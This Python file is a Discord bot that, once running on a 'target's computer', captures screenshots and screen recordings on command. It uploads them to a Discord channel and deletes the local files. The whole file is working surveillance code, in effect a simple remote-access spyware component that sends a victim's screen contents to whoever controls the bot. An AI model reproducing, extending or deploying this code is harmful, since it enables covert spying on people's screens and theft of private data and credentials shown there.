import pyautogui
import time
from Modules import ScreenRecordModule
import discord
from discord.ext import commands
import os

TOKEN = "PASTE_YOUR_DISCORD_BOT_TOKEN_HERE"
WARNING = """
Warning! this method of recording is VERY unstable at the moment. I can currently do 25 fps @ 
5 seconds comfortably, and reccomend only recording in 25 second long chunks, framse are stored 
in MEMORY at the moment and not physical storage so for that reason please excerise caution
"""

intents = discord.Intents.all()                         # intents variable for the bots intents
bot = commands.Bot(command_prefix='?', intents=intents) # bot variable holding the bot class
tree = bot.tree                                         # this is for / commands


# this is a temporary asynchronus wait function to not block the main thread. blocking for more then 10 seconds will result in issues
async def wait(duration):
    time.sleep(duration)


# sync app commands
@bot.command(name="sync") 
async def syncCommand(ctx):
    msg = await ctx.send("Syncing...")
    await tree.sync()
    await msg.edit(content="Done!")


# captures a screenshot
@tree.command(name="screenshot", description="Screenshot the contents of the targets computer")
async def screenshotCommand(interaction:discord.Interaction, delay:int=0):
    await interaction.response.defer()          # defers the interaction just in case of delay
    time.sleep(delay)                           # delays the program if provided
    pyautogui.screenshot("image.png")           # captures the screenshot
    file = discord.File("image.png")            # creates a discord file object of the screenshot
    await interaction.followup.send(file=file)  # sends the file
    os.remove("image.png")                      # removes the file from the computer



@tree.command(name="record", description="Records the screen for a set duration and framerate")
async def recordCommand(interaction:discord.Interaction, duration:int=5):
    await interaction.channel.send(WARNING)                             # Sends a warning message to the channel
    await interaction.response.defer()                                  # defers the interaction just in case of delay, which there will be
    SRM = ScreenRecordModule()                                          # initilize the module
    SRM.recordScreen(duration)                                          # record the screen
    await wait(3+duration)                                              # wait the duration of the recording plus a few extra seconds
    await interaction.followup.send(
        file=discord.File("output.avi"))                                # find the file and send it
    os.remove("output.avi")                                             # removes the file from the computer


bot.run(TOKEN)